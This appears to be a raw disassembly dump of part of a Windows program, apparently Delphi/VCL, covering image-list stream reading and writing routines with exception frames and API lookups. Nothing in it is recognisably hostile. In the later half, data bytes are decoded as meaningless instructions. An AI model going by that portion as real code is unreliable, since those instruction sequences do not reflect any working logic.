mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4197a4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44c3d0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c484
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_4158f8
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_4158f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c708
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4156cc
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_4156ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c6eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_422a24
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412640
mov eax [ ebp - 0x4 ]
call sub_44cab0
xor eax eax
push ebp
push sub_44c6ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c6d5
mov eax [ ebp - 0xc ]
call sub_403290
mov eax [ ebp - 0x14 ]
call sub_403290
mov eax [ ebp - 0x4 ]
call sub_44cab4
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412668
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_421c54
push eax
mov eax [ ebp - 0xc ]
call sub_421c54
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d184
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412668
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421c54
push eax
mov eax [ ebp - 0x14 ]
call sub_421c54
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d184
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b6ac
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44c718
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419f24
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c778
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b534
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c77f
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub eax 0xffffffec
sub_44c77f
mov eax [ ebp - 0x4 ]
call sub_44b39c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44c8ae
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4156ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_415df4
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4156ec
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403290
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4156ec
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419f24
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44c891
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_4156ec
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44b534
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_4156ec
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44c8e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44b5d4
mov eax edi
call sub_4156cc
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_4156ec
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44c484
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44c718
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44c96c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_419f24
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ca66
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bce0
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44b570
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44b570
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ca6d
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
jmp r-xdata
sub_44cad4
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov edx esi
call sub_44c244
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_44cb20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44cb45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cb4c
retn
sub_44cb5c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]

sub_44cb7a
inc esp
add [ eax + eax ] cl
add [ eax ] al
push 0xd800406f
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
dec ebp
outsb
jne r-xdata
hlt
jb r-xdata
or [ gs : ebp + ecx * 2 + 0x65 ] edx
outsb
outsd
jb r-xdata
arpl [ eax + ecx + 0x7 ] si
je r-xdata
dec esp

mov ah 0xcb
inc esp
add [ ebx ] al
or dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
jb r-xdata
jae r-xdata
arpl [ eax + eax + 0x8 ] si
insd
add [ edi ] al
push edx
bound esi [ gs : ebp + 0x69 ]
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
enter 0x44cf 0x0
add [ eax ] dl
inc eax
add [ esp + ecx * 8 + 0x44 ] cl
outsb
inc ebp
jbe r-xdata
jb r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x7 ] si
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
mov dl 0x41
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 2 + 0x40 ] ch
outsb
arpl [ ebp + 0x64 ] sp
inc edx
outsd
outsd
insb
popad
pop es
jb r-xdata
jb r-xdata
outsb
je r-xdata
jne r-xdata
outsb
popad
imul eax [ ecx ] 0x0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60044cb ] dh
insd
bound ecx [ esi + 0x6f ]
outsb
pop es
insd
bound eax [ edx + 0x72 ]
popad
imul ecx [ edx ] 0x6d
bound eax [ edx + 0x61 ]
jb r-xdata
jb r-xdata
jae r-xdata
push ebx
insb
add [ eax ] cl
push esp
push edx
arpl [ gs : eax + eax + 0x8 ] si
arpl [ gs : eax + ecx + 0x7 ] si
jae r-xdata
jb r-xdata
popad
jae r-xdata
push esp
dec edi
ja r-xdata
jb r-xdata
sbb dl [ ecx + eax * 2 + 0x64 ]
jbe r-xdata
add [ eax ] cl
ja r-xdata
inc ecx
inc ebx
popad
outsb
jbe r-xdata
or [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
jb r-xdata
or [ edi ] al
inc ecx
inc ebx
popad
outsb
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ 0x63655241 ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
arpl [ gs : ebp + 0x64 ] si
pop es
insb
je r-xdata
add eax 0x63655241
hlt
popad
add [ bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + ecx * 8 + 0x6d0b0044 ] bl
jb r-xdata
push 0x6e490774
jb r-xdata
add [ eax ] dh
int 0x44
add [ eax ] cl
adc eax 0x6e654d54
ja r-xdata
outsb
add ah dh
adc [ eax ] al
mov dl 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
nop
mov eax 0x80044cc
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ eax ] cl
adc dl [ ebp + ecx * 2 + 0x65 ]
outsb
jne r-xdata
inc esp
popad
imul eax [ 0x756e654d ] 0x73
lea eax [ eax ]
popad
inc ecx
jne r-xdata
jae r-xdata
add [ 0x74617453 ] al
andps xmm1 [ gs : edi + 0x77 ]
push esp
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
arpl [ eax + ecx + 0x7 ] si
jae r-xdata
inc eax
add ah ah
xor al 0x40
add al ch
outsd
insd
popad
je r-xdata
dec ebp
outsb
dec ecx
je r-xdata
dec ebp
outsb
jb r-xdata
jb r-xdata
ja r-xdata
je r-xdata
insd
inc ebp
jbe r-xdata
arpl [ ebp + 0x9 ] sp
push esp
dec ebp
add [ 0x74646957 ] eax
push esp
inc ebx
popad
outsb
jbe r-xdata
je r-xdata
popad
je r-xdata
add eax 0x63655241
add [ ebx + 0x44 ] cl
add al bh
loopne r-xdata
lodsb [ esi ]
arpl [ eax ] cx
insd
popad
dec ebp
popad
je r-xdata
je r-xdata
jne r-xdata
insd
inc ebp
jbe r-xdata
add [ eax ] al
add [ eax + 0x34d80044 ] ch
jne r-xdata
jb r-xdata
je r-xdata
jne r-xdata
dec ebp
outsb
insd
inc ebp
jbe r-xdata
dec ebp
outsb
jne r-xdata
outsb
je r-xdata
je r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
outsb
jne r-xdata
imul esp [ ebx + 0x8 ] 0x614d616d
jae r-xdata
push 0x746e4907
outsb
andps xmm1 [ edi + 0x77 ]
in al dx
arpl [ ecx + ebp * 2 + 0x6f ] si
add [ ebx + 0x44 ] ch
add [ ebx - 0x1f97ffbc ] cl
inc esp
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
add [ ecx - 0x1ed7ffbc ] cl
inc esp
add ah ah
cmpsd [ esi ] [ edi ]
inc esp
add [ eax - 0x1f ] bl
inc esp
add al cl
loope r-xdata
mov al [ 0x34d80044 ]
insb
or [ ebp + 0x61 ] ch
push eax
popad
jb r-xdata
inc esp
add al dh
pushfd
inc esi
insb
popad
add [ bx + si ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + ecx * 8 + 0x4d050044 ] bl
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
into
insd
inc ecx
jne r-xdata
outsb
je r-xdata
inc ecx
add [ ebx - 0x63bfffbc ] ch
inc ecx
add ah dl
pushfd
inc ecx
add [ eax ] ch
popfd
inc ecx
add [ eax - 0x37ffbb20 ] dl
outsd
je r-xdata
dec ebp
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jb r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
add eax 0x74646957
or al [ ebp ]
jl r-xdata
add [ eax ] ch
inc [ eax + eax - 0x48 ]
in al dx
inc esp
add al bl
add [ ebp ] al
inc esp
or [ ebp ] al
add [ esi ] al
inc ebp
add [ eax ] bh
pop es
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
jecxz r-xdata
inc esp
add ah bh
loope r-xdata
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ ecx + eax * 2 + 0x44e04c00 ] bl
outsb
je r-xdata
loopne r-xdata
mov eax eax
pop eax
into
inc esp
inc esp
add [ eax + eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xce
outsd
inc esi
insb
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
add ah dh
adc [ eax ] al
add al 0x8
push es
push ebx
outsb
inc ebp
add [ ebp + eax + 0x9ec0045 ] al
inc ebp
add al bl
or [ ebp ] eax
fadd [ edx ]
inc ebp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
inc ebp
add [ ebp + eax + 0x45 ] cl
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
push esp
in al 0x44
add al ah
or al 0x45
add [ edx + ebp * 8 + 0x44 ] ah
add [ eax ] dh
inc eax
inc ecx
add [ eax + ebp * 8 + 0xd580044 ] ch
inc ebp
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add al bl
jecxz r-xdata
add [ eax + eax + 0x23400000 ] ch
inc ecx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
add al dh
xchg esp eax
inc ecx
add ah ch
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax ] dh
loop r-xdata
jne r-xdata
call 0x34512b6
or eax 0x6e654d54
dec ebp
outsb
jne r-xdata
add ah dh
adc [ eax ] al
mov dl 0x41
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x44cda0c0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
dec ecx
outsb
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
je r-xdata
imul esi [ eax ] 0xffffffcf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x1d53ffbc ] cl
inc esp
add ah cl
loop r-xdata
add [ esp + ebx * 4 - 0x1d9bffbf ] bh
add [ eax + 0x44 ] cl
push es
add [ esi ] al
inc edx
inc ebx
push 0x9c6b6365
int 0x44
add [ ebx ] bh
add [ eax ] al
dec [ edx + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
arpl [ ebx - 0x64 ] bp
insd
int3
add [ eax - 0x31 ] bh
add ah ch
loop r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add ah cl
iretd
add [ eax - 0x58 ] bl
inc esp
add [ ebx ] cl
inc esp
add [ eax - 0x58 ] ah
inc esp
add [ eax + ebp * 4 + 0x44 ] ah
add [ eax ] ch
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
popad
jns r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
[ eax ]
insd
popad
jae r-xdata
add bh bh
in al dx
add al [ ebp ]
ror [ ebx ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
pushfd
int 0x44
add [ eax + eax ] bh
add bh bh
mov [ esi ] dl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
movsb [ edi ] [ esi ]
add eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
push [ eax + 0x4503 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
pop esp
add eax [ ebp ]
loopne r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
[ ebx + eax + 0x45 ]
add al ah
or eax [ ebp ]
add [ eax ] al
add [ eax ] al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44cbb070
add [ eax ] cl
add bh bh
fadd [ edx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc eax
mov eax 0x8e00041
inc ebp
add [ eax + 0x9 ] bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
js r-xdata
je r-xdata
inc ebx
push 0x656b6365
insb
mov cl 0x44
add [ eax + eax ] bh
[ ebp + ecx + 0x10045 ]
add [ edi ] al
or [ eax ] eax
pop es
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax * 2 ] 0x80
add [ eax ] al
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
and [ eax * 2 ] cl
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
or al 0x45
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc [ eax ] al
cmp [ eax ] eax
add bh bh
mov al 0x3
inc ebp
add [ eax ] al
cwde
inc ebx
jne r-xdata
inc ecx
add [ ebx + ebx * 4 + 0x34e40041 ] bl
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec esp
add al 0x45
add [ eax + 0x450c ] ah
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x88656c62
adc [ ecx ] eax
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
ror [ eax * 2 ] 0x80
add [ eax ] al
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
add [ edx - 0x49ffbb2d ] ah
rol [ eax + eax + 0x58 ] cl
add [ eax ] al
add [ eax + 0x23 ] al
je r-xdata
add [ 0x654d6e4f ] cl
popad
je r-xdata
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ edi ] ss
inc ebp
add [ ecx + eax * 2 ] dl
inc ecx
add [ edi + edx * 4 + 0x40300041 ] ah
inc ecx
add [ edi + ebx + 0x20500045 ] dh
jae r-xdata
insd
sub al 0xcd
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add al dh
push ss
pushfd
cwde
jb r-xdata
nop
rol [ eax + eax - 0x40 ] cl
add [ eax ] al
insd
mov ah 0xcc
inc esp
add [ eax - 0x67010000 ] bl
inc ebp
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
dec ecx
je r-xdata
inc ebp
add [ edi + ebx + 0x17e00045 ] bl
inc ebp
add ah cl
pop ds
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
cwde
inc ecx
add [ ecx + ebx * 4 - 0x644bffbf ] al
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x16f00041 ] bh
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
push esp
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffbb2d ] dl
sub_44d5ba
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
loopne r-xdata
imul ecx [ ebp + 0x6f ] 0xcbf06564
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
pushad
jo r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah bl
aad 0x44
add [ esi ] al
jo r-xdata
add [ edx + esi + 0x40 ] al
add ah ah
sub eax [ ebp ]
adc al 0x41
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
add [ eax - 0x5fffbadc ] dl
and al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc ecx
add [ edi + edx * 4 + 0x40300041 ] ah
inc ecx
add [ edi + ebx + 0x20500045 ] dh
inc ebp
add [ eax + ebx * 4 - 0x667bffbf ] cl
inc ecx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax + 0x2b ] dh
inc ebp
add [ edi + ebx + 0x17e00045 ] bl
inc ebp
add ah cl
pop ds
inc ebp
add [ eax ] bl
sub al 0x45
add al dl
sub al 0x45
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
salc
inc esp
outsd
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
in al 0x2b
inc ebp
add [ ecx + eax * 2 ] dl
inc eax
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
